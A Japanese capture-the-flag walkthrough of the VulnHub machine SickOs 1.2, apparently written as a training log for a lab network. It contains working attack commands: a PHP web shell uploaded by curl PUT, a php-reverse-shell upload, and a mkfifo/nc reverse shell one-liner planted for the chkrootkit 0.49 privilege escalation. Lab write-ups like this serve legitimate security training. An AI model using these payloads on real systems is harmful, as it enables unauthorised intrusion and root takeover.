## Description
- SickOs: Level 1.2を利用してリバースシェルによる特権昇格を学ぶ
- Kalilinuxを攻撃サーバとしてVM環境に構築。KioptrixもVM環境で構築する

### 参考情報
https://www.vulnhub.com/
https://www.vulnhub.com/entry/sickos-12,144/

Kalilinuxの構築
https://qiita.com/y-araki-qiita/items/4621a21e9f0d2e38c331
SixOsのサーバ構築
https://medium.com/@obikag/how-to-get-kioptrix-working-on-virtualbox-an-oscp-story-c824baf83da1

## 1, IPアドレスを特定する
- `netdiscover`コマンドにてIPを調査

## 2, 特定したIPに対してNmapスキャンを実行し、使用しているサービスを特定する
- `nmap`コマンドにて使用サービスを調査 
```
$ nmap -Pn 192.168.3.42
Nmap scan report for 192.168.3.42
Host is up (0.00067s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
```
2つのポート(80,22)が空いてるのを確認

## 3, 80ポートが空いているのでブラウザからアクセスをしてみる
- http://192.168.3.42
画像が表示される


## 4, dirbを使用してディレクトリ走査
```
$ dirb http://192.168.3.42
```
http://192.168.3.38/test　というディレクトリを発見
アクセスするとtest配下のファイルが表示される

## 5, curlでHTTP OPTIONSを調査する
```
$ curl -v -X OPTIONS http://192.168.3.42/test/
*   Trying 192.168.3.42...
* TCP_NODELAY set
* Connected to 192.168.3.42 (192.168.3.42) port 80 (#0)
> OPTIONS /test/ HTTP/1.1
> Host: 192.168.3.42
> User-Agent: curl/7.64.1
> Accept: */*
>
< HTTP/1.1 200 OK
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Allow: OPTIONS, GET, HEAD, POST
< Content-Length: 0
< Date: Thu, 16 Apr 2020 12:57:37 GMT
< Server: lighttpd/1.4.28
<
* Connection #0 to host 192.168.3.42 left intact
* Closing connection 0
```
POSTがALLOWされていた

## 6, curlでphpファイルをアップロードしてみる
```
$ curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.3.42/test/cmd.php
*   Trying 192.168.3.42...
* TCP_NODELAY set
* Connected to 192.168.3.42 (192.168.3.42) port 80 (#0)
> PUT /test/cmd.php HTTP/1.1
> Host: 192.168.3.42
> User-Agent: curl/7.64.1
> Accept: */*
> Content-Length: 29
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 29 out of 29 bytes
< HTTP/1.1 201 Created
< Content-Length: 0
< Date: Thu, 16 Apr 2020 13:06:34 GMT
< Server: lighttpd/1.4.28
<
* Connection #0 to host 192.168.3.42 left intact
* Closing connection 0
```
成功。http://192.168.3.42/test/配下にアクセスするとcmd.phpが作成されている

## 7, アップロードしたファイルを実行する
http://192.168.3.42/test/cmd.php?cmd=ls
lsの実行結果が表示されている

## リバースシェルファイルをアップロードする
対象のサーバにファイルをアップロード出来たので、リバースシェルのファイルをアップロードしてみる
使用するのはphp-reverse-shell
```
$ cp /usr/share/webshells/php/php-reverse-shell.php exploit.php
$ vi exploit.php
ip = '192.168.3.39' #待ち受けサーバのIPに変換
port = '443'

# nmapコマンドを使用してアプロード
$ nmap -p 80 192.168.3.42 --script http-put --script-args http-put.url='/test/exploit.php',http-put.file='exploit.php'
```

## 8, 攻撃サーバにて待ち受け&リバースシェルファイルの実行
```
# sudo nc -lvp 443
```
ブラウザにてhttp://192.168.3.42/test/exploit.phpにアクセス
待ち受けサーバにアクセスされたら成功

## 9,サーバ内調査
cronの内容を調査
```
# ls /etc/cron.daily
apt
aptitude
bsdmainutils
chkrootkit
dpkg
lighttpd
logrotate
man-db
mlocate
passwd
popularity-contest
standard
```
chkrootkitのバージョンを調査
```
# chkrootkit -V
chkrootkit version 0.49
```

## 10, 脆弱性の調査
```
# searchsploit chkrootkit
```
`exploits/linux/local/33899.txt` の記載にしたがって特権昇格を狙う

## 11, tmp配下にファイルを仕込む
```
$ cd /tmp             
$ echo '#!/bin/bash' > update
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.3.39 443 >/tmp/f' >> update
$ chmod 777 update
```
攻撃サーバにて443ポートで待ち受けると応答がある
```
# sudo nc -lvp 443
```

## root昇格
```
# cd /root
# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
```





